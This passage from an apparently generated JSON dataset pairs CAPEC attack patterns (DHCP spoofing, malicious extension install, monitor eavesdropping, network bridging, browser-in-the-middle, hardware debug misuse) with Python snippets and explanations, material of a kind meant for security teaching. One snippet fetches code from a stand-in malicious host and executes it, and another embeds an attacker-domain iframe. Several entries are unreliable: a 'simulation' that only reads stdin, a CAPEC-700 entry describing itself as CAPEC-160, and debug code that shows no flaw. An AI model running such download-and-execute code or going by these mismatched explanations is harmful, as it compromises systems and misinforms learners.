        "code_snippet": "import socket\n\n# Vulnerable DHCP server implementation\nclass DHCPServer:\n    def __init__(self, ip, port):\n        self.ip = ip\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind((self.ip, self.port))\n\n    def listen(self):\n        while True:\n            data, addr = self.sock.recvfrom(1024)\n            print(f'Received message from {addr}: {data}')\n            self.handle_dhcp_request(data, addr)\n\n    def handle_dhcp_request(self, data, addr):\n        # Vulnerable: No proper validation of the source\n        if data.startswith(b'DHCPDISCOVER'):\n            response = b'DHCPOFFER' + data[12:16]  # Simplified response\n            self.sock.sendto(response, addr)\n            print(f'Sent DHCPOFFER to {addr}')\n\n# Start the vulnerable DHCP server\nserver = DHCPServer('0.0.0.0', 67)\nserver.listen()",
        "description": "This Python code snippet represents a vulnerable DHCP server that listens for DHCPDISCOVER messages and responds with DHCPOFFER messages. The server does not properly validate the source of the incoming requests, making it susceptible to DHCP spoofing attacks. An attacker could exploit this by sending spoofed DHCPDISCOVER messages to the server, causing it to respond with DHCPOFFER messages to unintended endpoints. This embodies the main idea of CAPEC-290 (DHCP Spoofing) and demonstrates related weaknesses such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-291 (Reliance on IP Address for Authentication)."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import requests\nimport os\nimport sys\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_extension.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-426: Untrusted Search Path\nextension_path = '/tmp/malicious_extension.py'\nwith open(extension_path, 'wb') as file:\n    file.write(response.content)\n\n# CWE-507: Trojan Horse\n# CWE-506: Embedded Malicious Code\nsys.path.insert(0, '/tmp')\nimport malicious_extension\n\n# Execute a function from the malicious extension\nmalicious_extension.execute_malicious_code()",
        "description": "This Python code snippet demonstrates the concept of 'Install Malicious Extension' by downloading and executing a malicious extension. The code downloads a Python script from a remote URL without verifying its integrity (CWE-494). It then saves the script to a temporary directory and modifies the system path to include this directory (CWE-829, CWE-426). The script is imported and executed, potentially containing hidden malicious functionality (CWE-507, CWE-506). This represents how an adversary might trick a user into installing and running a malicious extension within a trusted environment."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import os\nimport time\nimport random\n\n# Simulate sensitive data being displayed on a monitor\nsensitive_data = 'Sensitive Information: Password123'\n\n# Function to simulate electromagnetic emissions (EME) from a monitor\ndef emit_eme(data):\n    for char in data:\n        # Simulate EME by printing characters with a delay\n        print(char, end='', flush=True)\n        time.sleep(random.uniform(0.05, 0.2))\n\n# Function to simulate an attacker capturing EME\ndef capture_eme():\n    captured_data = ''\n    while True:\n        # Simulate capturing EME by reading characters\n        captured_char = os.read(0, 1).decode('utf-8')\n        if captured_char:\n            captured_data += captured_char\n            print(f'Captured: {captured_char}')\n        if len(captured_data) >= len(sensitive_data):\n            break\n    return captured_data\n\n# Simulate the monitor emitting EME\nemit_eme(sensitive_data)\n\n# Simulate the attacker capturing the EME\ncaptured_data = capture_eme()\nprint(f'Attacker captured: {captured_data}')",
        "description": "This Python code snippet simulates the concept of 'Eavesdropping on a Monitor' by demonstrating how an attacker could capture electromagnetic emissions (EME) from a monitor displaying sensitive information. The 'emit_eme' function simulates the monitor emitting EME by printing characters of sensitive data with random delays. The 'capture_eme' function simulates an attacker capturing these emissions by reading characters from the standard input. This represents the vulnerability described in CAPEC, where an attacker can eavesdrop on the content of an external monitor without modifying any cable or installing software. The code also touches on related CWEs, such as improper protection of physical side channels (CWE-1300) and cleartext transmission of sensitive information (CWE-319), by demonstrating how sensitive data can be exposed through physical phenomena."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import socket\n\nclass NetworkBridge:\n    def __init__(self, trusted_ip, untrusted_ip, port):\n        self.trusted_ip = trusted_ip\n        self.untrusted_ip = untrusted_ip\n        self.port = port\n\n    def create_channel(self):\n        try:\n            # Create a socket to the trusted network\n            trusted_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            trusted_sock.connect((self.trusted_ip, self.port))\n\n            # Create a socket to the untrusted network\n            untrusted_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            untrusted_sock.connect((self.untrusted_ip, self.port))\n\n            # Bridge the two networks\n            while True:\n                data = trusted_sock.recv(1024)\n                if not data:\n                    break\n                untrusted_sock.sendall(data)\n\n                data = untrusted_sock.recv(1024)\n                if not data:\n                    break\n                trusted_sock.sendall(data)\n        except Exception as e:\n            print(f\"Error: {e}\")\n        finally:\n            trusted_sock.close()\n            untrusted_sock.close()\n\n# Example usage\nbridge = NetworkBridge('192.168.1.10', '10.0.0.10', 8080)\nbridge.create_channel()",
        "description": "This Python code snippet demonstrates a simple network bridge that connects a trusted network (192.168.1.10) and an untrusted network (10.0.0.10) on port 8080. The `NetworkBridge` class creates sockets to both networks and continuously transfers data between them. This code embodies the main idea of CAPEC-160 (Network Boundary Bridging) by creating a channel that bridges trusted and untrusted networks. The code also highlights several related CWEs: it does not verify the identity of endpoints (CWE-300), does not ensure message integrity (CWE-924), and mixes trusted and untrusted data (CWE-501). This lack of proper access control and verification makes the network vulnerable to attacks."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import http.server\nimport socketserver\nimport threading\nimport requests\n\nclass RemoteDesktopHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/remote':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(b'<html><body><h1>Remote Desktop</h1><iframe src=\"http://attacker.com/remote\" width=\"100%\" height=\"100%\"></iframe></body></html>')\n        else:\n            self.send_response(404)\n            self.end_headers()\n\nclass MITMServer(socketserver.ThreadingMixIn, http.server.HTTPServer):\n    pass\n\ndef start_server():\n    server_address = ('', 8080)\n    httpd = MITMServer(server_address, RemoteDesktopHandler)\n    httpd.serve_forever()\n\nif __name__ == '__main__':\n    server_thread = threading.Thread(target=start_server)\n    server_thread.daemon = True\n    server_thread.start()\n    print('Server started on port 8080')\n\n    # Simulate a client accessing the remote desktop\n    response = requests.get('http://localhost:8080/remote')\n    print(response.text)",
        "description": "This Python code sets up a simple HTTP server that serves a remote desktop session from an attacker's domain. The server listens on port 8080 and responds to requests at the '/remote' path by embedding an iframe that loads content from 'http://attacker.com/remote'. This demonstrates the 'Browser in the Middle (BiTM)' attack, where an adversary can establish a remote desktop connection in the victim's browser. The code also simulates a client accessing this remote desktop. The vulnerabilities demonstrated include CWE-830 (Inclusion of Web Functionality from an Untrusted Source) by embedding an iframe from an untrusted domain, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to enforce security measures."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent:\n    def __init__(self, authorized_users):\n        self.authorized_users = authorized_users\n        self.debug_functions = ['read_registers', 'write_registers', 'inject_errors']\n        self.access_granted = False\n\n    def authorize(self, user):\n        if user in self.authorized_users:\n            self.access_granted = True\n        else:\n            self.access_granted = False\n\n    def execute_debug_function(self, user, function):\n        self.authorize(user)\n        if self.access_granted:\n            if function in self.debug_functions:\n                print(f\"Executing {function} for {user}\")\n            else:\n                print(f\"Function {function} not available\")\n        else:\n            print(f\"Unauthorized access attempt by {user}\")\n\n# Example usage\nusers = ['admin', 'developer']\ndebug_component = DebugComponent(users)\n\n# Authorized user\ndebug_component.execute_debug_function('admin', 'read_registers')\n\n# Unauthorized user\ndebug_component.execute_debug_function('hacker', 'inject_errors')",
        "description": "This Python code snippet defines a `DebugComponent` class that simulates a hardware debug component with access control mechanisms. The class has a list of authorized users and a set of debug functions. The `authorize` method checks if a user is authorized, and the `execute_debug_function` method executes a debug function if the user is authorized. This code embodies the main idea of the CAPEC by demonstrating how incorrect chaining or granularity of debug components can lead to unauthorized access if not properly managed. The code also touches on related CWEs by showing how improper access control (CWE-1191) and unauthorized error injection (CWE-1334) can be mitigated through proper authorization checks."
    }
]